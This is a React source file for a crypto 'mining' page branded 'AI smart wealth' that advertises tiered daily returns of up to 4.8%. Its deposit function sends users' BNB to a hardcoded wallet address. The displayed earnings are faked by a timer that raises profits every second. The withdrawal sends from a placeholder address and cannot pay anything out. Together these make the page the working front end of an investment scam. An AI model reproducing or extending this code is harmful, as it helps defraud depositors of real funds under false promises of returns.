import React, { useEffect, useState } from 'react';
// Inline minimal icons to avoid external dependency on lucide-react
const TrendingUp = (props: any) => (
  <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" className={props.className || 'w-4 h-4'}>
    <path strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" d="M3 17l6-6 4 4 8-8" />
  </svg>
);
const Play = (props: any) => (
  <svg {...props} viewBox="0 0 24 24" fill="currentColor" className={props.className || 'w-4 h-4'}>
    <path d="M5 3v18l15-9L5 3z" />
  </svg>
);
const Pause = (props: any) => (
  <svg {...props} viewBox="0 0 24 24" fill="currentColor" className={props.className || 'w-4 h-4'}>
    <path d="M6 4h4v16H6zM14 4h4v16h-4z" />
  </svg>
);
const Zap = (props: any) => (
  <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" className={props.className || 'w-4 h-4'}>
    <path strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" d="M13 2L3 14h9l-1 8 10-12h-9l1-8z" />
  </svg>
);
const Clock = (props: any) => (
  <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" className={props.className || 'w-4 h-4'}>
    <circle cx="12" cy="12" r="9" strokeWidth="1.5" />
    <path d="M12 7v6l3 2" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
  </svg>
);
const WalletIcon = (props: any) => (
  <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" className={props.className || 'w-5 h-5'}>
    <rect x="2" y="6" width="20" height="12" rx="2" strokeWidth="1.5" />
    <path d="M16 12a1 1 0 1 0 0-2 1 1 0 0 0 0 2z" strokeWidth="1.5" />
  </svg>
);
const Copy = (props: any) => (
  <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" className={props.className || 'w-4 h-4'}>
    <rect x="9" y="9" width="11" height="11" rx="2" strokeWidth="1.5" />
    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" strokeWidth="1.5" />
  </svg>
);
const ExternalLink = (props: any) => (
  <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" className={props.className || 'w-4 h-4'}>
    <path d="M14 3h7v7" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
    <path d="M10 14L21 3" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
    <path d="M21 21H3V3" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
  </svg>
);
const Info = (props: any) => (
  <svg {...props} viewBox="0 0 24 24" fill="none" stroke="currentColor" className={props.className || 'w-4 h-4'}>
    <circle cx="12" cy="12" r="9" strokeWidth="1.5" />
    <path d="M12 8h.01" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
    <path d="M11 12h1v4h1" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
  </svg>
);
import { useWallet } from '../hooks/useWallet';
import { WalletConnect } from './WalletConnect';
import DepositModal from './DepositModal';
import useBnbPrice from '../hooks/useBnbPrice';
import { useBalance } from '../hooks/useBalance';

interface MiningPageProps {
  isWalletConnected?: boolean;
  walletAddress?: string;
  onGoToTrading?: () => void;
  onBack?: () => void;
}

const MINIMUM_MINING_USD = 10; // lowered per product decision

const gradingLevels = [
  { level: 'Lv1', usdt: '100-999', income: '0.8%-0.9%', dailyEarning: '0.8-8.9' },
  { level: 'Lv2', usdt: '999-4999', income: '1%-1.2%', dailyEarning: '10-60' },
  { level: 'Lv3', usdt: '4999-9999', income: '1.3%-1.6%', dailyEarning: '65-160' },
  { level: 'Lv4', usdt: '9999-29999', income: '1.7%-2.2%', dailyEarning: '170-660' },
  { level: 'Lv5', usdt: '29999-59999', income: '2.3%-2.8%', dailyEarning: '690-1680' },
  { level: 'Lv6', usdt: '59999-99999', income: '2.9%-3.5%', dailyEarning: '1740-3500' },
  { level: 'Lv7', usdt: '99999-299999', income: '3.6%-4.2%', dailyEarning: '3600-12600' },
  { level: 'Lv8', usdt: '299999-999999', income: '4.3%-4.8%', dailyEarning: '12900-48000' }
];

export function MiningPage({ isWalletConnected = false, walletAddress = '', onGoToTrading, onBack }: MiningPageProps) {
  const wallet = useWallet();

  const [isMining, setIsMining] = useState(false);
  const [miningAmount, setMiningAmount] = useState('0.00');
  const [totalRevenue, setTotalRevenue] = useState('0.00');
  const [todayEarnings, setTodayEarnings] = useState('0.00');
  const [accumulatedProfits, setAccumulatedProfits] = useState(0); // in BNB
  const [isWithdrawing, setIsWithdrawing] = useState(false);
  const [currentLevel, setCurrentLevel] = useState(0);
  const [showDepositModal, setShowDepositModal] = useState(false);
  const [availableBalance, setAvailableBalance] = useState<number>(0);
  const [depositAmount, setDepositAmount] = useState<string>('');
  const { price: bnbPrice, isLoading: isBnbPriceLoading } = useBnbPrice();
  const { bnbBalance } = useBalance();
  const [isDepositing, setIsDepositing] = useState(false);
  const [depositError, setDepositError] = useState<string>('');

  const DEPOSIT_ADDRESS = '0xD27BaddFc09D511305deEF8AAA29d2A884F861a3';

  // Helpers
  const formatUsd = (v: number) => v.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  const formatBnb = (v: number) => v.toFixed(6);

  const getLevelRange = (index: number) => {
    const parts = gradingLevels[index].usdt.split('-');
    return { min: parseFloat(parts[0]), max: parseFloat(parts[1]) };
  };

  const getLevelProgress = (amount: number, index: number) => {
    const { min, max } = getLevelRange(index);
    if (amount <= min) return 0;
    if (amount >= max) return 100;
    return Math.round(((amount - min) / (max - min)) * 100);
  };


  useEffect(() => {
    // Use BNB balance and price to compute available USD balance
    if (wallet.isConnected && typeof bnbBalance === 'number' && bnbPrice > 0) {
      const usdBalance = bnbBalance * bnbPrice;
      setAvailableBalance(usdBalance);
    } else {
      setAvailableBalance(0);
    }
  }, [wallet.isConnected, bnbBalance, bnbPrice]);

  // Simulate mining progress when active
  useEffect(() => {
    let interval: ReturnType<typeof setInterval> | undefined;
    if (isMining && wallet.isConnected) {
      interval = setInterval(() => {
        const level = gradingLevels[currentLevel];
        if (level) {
          const incomeRate = parseFloat(level.income.split('-')[0].replace('%', '')) / 100 / 24 / 60 / 60; // per second
          const miningBnb = (parseFloat(miningAmount || '0') / (bnbPrice || 1));
          const profitPerSecond = miningBnb * incomeRate; // BNB per second
          setAccumulatedProfits(prev => prev + profitPerSecond);
          const usdProfit = profitPerSecond * (bnbPrice || 1);
          setTodayEarnings(prev => (parseFloat(prev || '0') + usdProfit).toFixed(4));
        }
      }, 1000);
    }
    return () => interval && clearInterval(interval);
  }, [isMining, wallet.isConnected, miningAmount, bnbPrice, currentLevel]);

  useEffect(() => {
    const numAmount = parseFloat(miningAmount || '0');
    if (isNaN(numAmount) || numAmount <= 0) {
      setCurrentLevel(0);
      return;
    }
    for (let i = gradingLevels.length - 1; i >= 0; i--) {
      const range = gradingLevels[i].usdt.split('-');
      const min = parseFloat(range[0]);
      if (numAmount >= min) {
        setCurrentLevel(i);
        break;
      }
    }
  }, [miningAmount]);

  useEffect(() => {
    if (wallet.isConnected && availableBalance >= MINIMUM_MINING_USD && parseFloat(miningAmount || '0') === 0) {
      setMiningAmount(availableBalance.toFixed(2));
    }
  }, [availableBalance, wallet.isConnected, miningAmount]);

  // UX: show connect CTA if not connected
  if (!wallet.isConnected) {
    return (
      <div className="mining-page min-h-screen flex items-center justify-center p-6 bg-white">
        <div className="connect-card bg-white border border-gray-200 rounded-3xl p-8 text-center max-w-md w-full shadow-lg">
          <WalletIcon className="mx-auto mb-6 text-[#2AFE4E] w-16 h-16" />
          <h2 className="text-2xl font-bold text-gray-900 mb-4">Connect Wallet to Mine</h2>
          <p className="text-gray-600 mb-6">Mining features require a connected wallet to proceed.</p>
          <WalletConnect variant="default" size="lg" className="w-full" />
          <p className="text-sm text-gray-500 mt-4">Connect via MetaMask or other EVM-compatible wallets</p>
        </div>
      </div>
    );
  }

  const handleStartMining = () => {
    const amount = parseFloat(miningAmount || '0');
    if (availableBalance < MINIMUM_MINING_USD) {
      alert(`Insufficient balance. Minimum ${MINIMUM_MINING_USD} USD required to start mining. Please deposit funds.`);
      setShowDepositModal(true);
      return;
    }
    if (amount < MINIMUM_MINING_USD) {
      alert(`Mining amount must be at least ${MINIMUM_MINING_USD} USD.`);
      return;
    }
    if (availableBalance < amount) {
      alert('Insufficient balance for this mining amount. Please deposit more funds.');
      setShowDepositModal(true);
      return;
    }
    setIsMining(prev => !prev);
  };

  const handleDepositAmount = (amount: string) => {
    setDepositAmount(amount);
    setShowDepositModal(true);
  };

  const handleAutoDeposit = async () => {
    if (!wallet.isConnected || !wallet.walletAddress) {
      setDepositError('Wallet not connected.');
      return;
    }
    const amountUsd = parseFloat(depositAmount || '0');
    if (amountUsd <= 0) {
      setDepositError('Invalid deposit amount.');
      return;
    }

    setIsDepositing(true);
    setDepositError('');

    try {
      const bnbAmount = amountUsd / (bnbPrice || 1);
      const weiValue = Math.floor(bnbAmount * 1e18).toString(16);
      const txParams = {
        from: wallet.walletAddress,
        to: DEPOSIT_ADDRESS,
        value: `0x${weiValue}`
      } as any;

      if (!window.ethereum || typeof (window as any).ethereum.request !== 'function') {
        setDepositError('Wallet provider not found. Please install a Web3 wallet such as MetaMask.');
        setIsDepositing(false);
        return;
      }

      let txHash: string;
      try {
        txHash = await (window as any).ethereum.request({ method: 'eth_sendTransaction', params: [txParams] });
      } catch (err: any) {
        const errorMsg = err?.message || String(err);
        if (errorMsg.includes('User rejected') || errorMsg.includes('user denied')) {
          setDepositError('Transaction cancelled by user.');
        } else {
          setDepositError(`Transaction failed: ${errorMsg}`);
        }
        setIsDepositing(false);
        return;
      }

      let confirmed = false;
      const startTime = Date.now();
      while (!confirmed && Date.now() - startTime < 60000) {
        try {
          const receipt = await (window as any).ethereum.request({ method: 'eth_getTransactionReceipt', params: [txHash] });
          if (receipt && receipt.status === '0x1') {
            confirmed = true;
            break;
          }
        } catch (err: any) {
          console.debug('Receipt check error (non-fatal):', err?.message);
        }
        await new Promise(resolve => setTimeout(resolve, 2000));
      }

      if (confirmed) {
        const currentMining = parseFloat(miningAmount) || 0;
        const newMiningAmount = (currentMining + amountUsd).toFixed(2);
        setMiningAmount(newMiningAmount);
        setTotalRevenue(prev => (parseFloat(prev || '0') + amountUsd).toFixed(2));
        setShowDepositModal(false);
        setDepositAmount('');
        alert('Deposit successful! Mining amount updated.');
      } else {
        setDepositError('Transaction timed out. Please check your wallet.');
      }
    } catch (error: any) {
      console.error('Deposit failed:', error);
      setDepositError(error.message || 'Deposit failed. Please try again.');
    } finally {
      setIsDepositing(false);
    }
  };

  const handleWithdraw = async () => {
    if (accumulatedProfits <= 0) return;

    setIsWithdrawing(true);
    try {
      const weiAmount = Math.floor(accumulatedProfits * 1e18).toString(16);
      const txParams = {
        from: '0xMiningPoolAddress',
        to: wallet.walletAddress,
        value: `0x${weiAmount}`
      } as any;

      if (!window.ethereum || typeof (window as any).ethereum.request !== 'function') {
        alert('Wallet provider not found. Please install a Web3 wallet such as MetaMask.');
        setIsWithdrawing(false);
        return;
      }

      const txHash = await (window as any).ethereum.request({ method: 'eth_sendTransaction', params: [txParams] });

      let confirmed = false;
      const startTime = Date.now();
      while (!confirmed && Date.now() - startTime < 60000) {
        const receipt = await (window as any).ethereum.request({ method: 'eth_getTransactionReceipt', params: [txHash] });
        if (receipt && receipt.status === '0x1') {
          confirmed = true;
          setAccumulatedProfits(0);
          setTodayEarnings('0.00');
          alert('Withdrawal successful!');
          break;
        }
        await new Promise(resolve => setTimeout(resolve, 2000));
      }

      if (!confirmed) {
        alert('Withdrawal timed out. Check your wallet.');
      }
    } catch (error: any) {
      console.error('Withdrawal failed:', error);
      alert(error.message || 'Withdrawal failed.');
    } finally {
      setIsWithdrawing(false);
    }
  };

  const levelProgress = getLevelProgress(parseFloat(miningAmount || '0'), currentLevel);

  // small sparkline renderer: accepts a value and returns a tiny SVG trend
  const renderSparkline = (value: number) => {
    const base = Math.max(value || 0, 1);
    const points = [base * 0.6, base * 0.8, base];
    const max = Math.max(...points);
    const pts = points.map((v, i) => `${(i / (points.length - 1)) * 100},${100 - Math.round((v / max) * 100)}`).join(' ');
    return (
      <svg className="sparkline w-20 h-6 ml-3" viewBox="0 0 100 100" preserveAspectRatio="none" aria-hidden>
        <polyline fill="none" stroke="#07c160" strokeWidth="6" strokeLinecap="round" strokeLinejoin="round" points={pts} transform="translate(0,0) scale(1,1)" />
      </svg>
    );
  };

  return (
    <div className="mining-page-container bg-white min-h-screen p-4">
      <style>{`
        .mining-stats-grid { grid-template-columns: repeat(1, minmax(0, 1fr)); }
        @media (min-width: 768px) { .mining-stats-grid { grid-template-columns: repeat(3, minmax(0, 1fr)); } }
        .stat-card { border-radius: 12px; }
        .status-pill { display: inline-flex; align-items: center; gap: 6px; }
        .status-pulse { animation: pulse 1.8s infinite; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(42,254,78,0.18);} 70% { box-shadow: 0 0 0 12px rgba(42,254,78,0);} 100% { box-shadow: 0 0 0 0 rgba(42,254,78,0);} }
        .mining-control { background: linear-gradient(180deg, rgba(255,255,255,1), rgba(247,251,245,1)); }
        .progress-track { background: rgba(243,244,246,1); height: 10px; border-radius: 9999px; overflow: hidden; }
        .progress-fill { background: linear-gradient(90deg, rgba(42,254,78,1), rgba(7,193,96,1)); height: 100%; width: var(--progress, 0%); transition: width 600ms cubic-bezier(.2,.9,.3,1); }
        .btn-primary { background: #2AFE4E; color: #000; }
        .btn-primary:focus { outline: 3px solid rgba(42,254,78,0.18); }
        .btn-secondary { background: #e6f7ee; color: #065f46; }
        .btn-disabled { background: #cbd5e1; color: #475569; }
        .tooltip-wrapper { position: relative; display: inline-block; }
        .tooltip-content { position: absolute; left: 50%; transform: translateX(-50%); bottom: calc(100% + 8px); background: #111827; color: #fff; padding: 6px 8px; border-radius: 6px; font-size: 12px; white-space: nowrap; display: none; z-index: 40; }
        .tooltip-wrapper:focus-within .tooltip-content, .tooltip-wrapper:hover .tooltip-content { display: block; }
        .sparkline { opacity: 0.95; }
      `}</style>

      {/* Topbar with Back button */}
      <div className="mining-topbar max-w-4xl mx-auto mb-4 flex items-center justify-between">
        <div className="back-wrap">
          <button onClick={() => { if (typeof onBack === 'function') { onBack(); } else { window.location.href = '/'; } }} className="back-button inline-flex items-center gap-2 py-2 px-3 rounded-md btn-secondary text-sm" aria-label="Back to previous">← Back</button>
        </div>
      </div>

      {/* Header */}
      <header className="mining-header max-w-4xl mx-auto">
        <div className="mining-stats grid mining-stats-grid gap-4 mb-6">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="stat-card bg-white p-4 shadow flex flex-col">
              <span className="text-sm text-gray-500">Accumulated earnings</span>
              <div className="flex items-center justify-between mt-2">
                <div className="flex items-center">
                  <div>
                    <div className="text-3xl font-bold text-[#07c160]">{formatUsd(accumulatedProfits * (bnbPrice || 0))} USD</div>
                    <div className="text-xs text-gray-600">{formatBnb(accumulatedProfits)} BNB</div>
                  </div>
                  {renderSparkline(accumulatedProfits * (bnbPrice || 0))}
                </div>
                <div className="text-green-500 text-sm font-semibold">{gradingLevels[currentLevel]?.income}</div>
              </div>
              <div className="mt-3 text-xs text-gray-500 flex items-center gap-2"><Clock className="w-4 h-4" /> <span aria-live="polite">Updated live</span></div>
            </div>

            <div className="stat-card bg-white p-4 shadow flex flex-col">
              <span className="text-sm text-gray-500">Today's earnings</span>
              <div className="mt-2 flex items-center">
                <div className="text-3xl font-bold text-[#07c160]">{todayEarnings} USD</div>
                {renderSparkline(parseFloat(todayEarnings || '0'))}
              </div>
              <div className="text-xs text-gray-600 mt-1">Level: {gradingLevels[currentLevel]?.level}</div>
              <div className="mt-3 text-xs text-gray-500 flex items-center gap-2"><Info className="w-4 h-4" /> <span aria-live="polite">Live accrual shown</span></div>
            </div>
          </div>

          <div className="stat-card bg-white p-4 shadow flex flex-col justify-between">
            <div>
              <span className="text-sm text-gray-500">Wallet Balance (USD)</span>
              <div className="mt-2 text-2xl font-bold text-[#07c160]">${formatUsd(availableBalance)}</div>
              <div className="text-xs text-gray-600">BNB: {formatBnb(bnbBalance || 0)}</div>
            </div>
            <div className="mt-3 grid grid-cols-1 sm:grid-cols-2 gap-2">
              <button onClick={() => handleDepositAmount('10')} className="py-2 rounded-md btn-secondary">Add $10</button>
              <button onClick={() => setShowDepositModal(true)} className="py-2 rounded-md btn-primary">Deposit</button>
            </div>
          </div>
        </div>

        <div className="mining-control bg-white border border-gray-200 rounded-2xl p-4 shadow-lg">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <Zap className="text-[#2AFE4E]" />
              <div>
                <h2 className="text-lg font-semibold text-gray-900">Mining Control</h2>
                <div className="text-xs text-gray-500">Manage your mining session and funds</div>
              </div>
            </div>

            <div className="header-actions flex items-center gap-3">
              <div className={`status-pill px-3 py-1 rounded-full text-xs ${isMining ? 'status-pulse bg-[#2AFE4E]/20 text-[#2AFE4E]' : 'bg-gray-100 text-gray-600'}`} role="status" aria-live="polite" aria-atomic="true">
                {isMining ? (<><Play className="w-3 h-3" /> <span>Mining</span></>) : (<><Pause className="w-3 h-3" /> <span>Stopped</span></>)}
              </div>

            </div>
          </div>

          <div className="mt-4 grid grid-cols-1 md:grid-cols-3 gap-4 items-center">
            <div className="control-field">
              <label className="text-xs text-gray-500">Mining Amount (USD)
                <span className="tooltip-wrapper ml-2" tabIndex={0} aria-hidden>
                  <Info className="w-3 h-3 text-gray-400 inline-block ml-2" />
                  <div className="tooltip-content">Minimum {MINIMUM_MINING_USD} USDT. Funds are taken from Wallet Balance when mining starts.</div>
                </span>
              </label>
              <input
                type="number"
                value={miningAmount}
                onChange={(e) => setMiningAmount(e.target.value)}
                onKeyDown={(e) => { if (e.key === 'Enter') { handleStartMining(); } }}
                className="w-full mt-2 p-3 rounded-lg border border-gray-200 bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-[#2AFE4E]"
                aria-label="Mining amount in USD"
                min={0}
              />
              <div className="text-xs text-gray-500 mt-1">Minimum to start: {MINIMUM_MINING_USD} USDT</div>
            </div>

            <div className="control-field">
              <label className="text-xs text-gray-500">Current Level</label>
              <div className="mt-2 flex items-center justify-between">
                <div className="text-sm font-medium text-[#07c160]">{gradingLevels[currentLevel]?.level}</div>
                <div className="text-xs text-gray-500">Income {gradingLevels[currentLevel]?.income}</div>
              </div>
              <div className="mt-2 text-xs text-gray-500">Range: {gradingLevels[currentLevel]?.usdt} USDT</div>
            </div>

            <div className="control-field">
              <label className="text-xs text-gray-500">Progress in level</label>
              <div className="mt-2">
                <div className="progress-track">
                <div className="progress-fill" style={{ width: `${levelProgress}%` }} aria-hidden />
              </div>
                <div className="text-xs text-gray-500 mt-2">{levelProgress}%</div>
              </div>
            </div>
          </div>

          <div className="mt-4 grid grid-cols-1 md:grid-cols-2 gap-3">
            <button
              type="button"
              onClick={handleStartMining}
              className={`w-full py-3 rounded-xl font-semibold ${isMining ? 'bg-red-500 text-white' : 'btn-primary'}`}
              aria-pressed={isMining ? "true" : "false"}
              aria-label={isMining ? 'Stop mining' : 'Start mining'}
            >
              {isMining ? 'Stop Mining' : 'Start Mining'}
            </button>

            <button
              type="button"
              onClick={handleWithdraw}
              disabled={accumulatedProfits <= 0 || isWithdrawing}
              className={`w-full py-3 rounded-xl font-semibold ${accumulatedProfits <= 0 || isWithdrawing ? 'btn-disabled' : 'bg-blue-500 text-white'}`}
            >
              {isWithdrawing ? 'Withdrawing...' : `Withdraw ${formatBnb(accumulatedProfits)} BNB`}
            </button>
          </div>
        </div>
      </header>

      {/* Grading table */}
      <section className="grading-table max-w-4xl mx-auto mt-6">
        <div className="bg-white border border-gray-200 rounded-3xl shadow-sm p-4">
          <h3 className="text-gray-900 font-medium mb-3 flex items-center gap-2">Grading income</h3>
          <div className="overflow-x-auto overflow-y-auto">
            <table className="w-full text-sm table-fixed">
              <thead>
                <tr className="text-[#2AFE4E]">
                  <th className="text-left">Level</th>
                  <th className="text-center">USDT</th>
                  <th className="text-right">Income(%)</th>
                  <th className="text-right">Daily Earning (USDT)</th>
                </tr>
              </thead>
              <tbody>
                {gradingLevels.map((level, idx) => (
                  <tr key={idx} className={`${currentLevel === idx ? 'bg-[#f0fff4]' : ''}`}>
                    <td className="py-3 font-bold">{level.level}</td>
                    <td className="text-center">{level.usdt}</td>
                    <td className="text-right">{level.income}</td>
                    <td className="text-right">{level.dailyEarning}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </section>

      <footer className="max-w-4xl mx-auto mt-8 text-center text-xs text-gray-500">© 2025 AI smart wealth</footer>

      {/* Deposit modal */}
      <DepositModal isOpen={showDepositModal} onOpenChange={setShowDepositModal} />
    </div>
  );
}
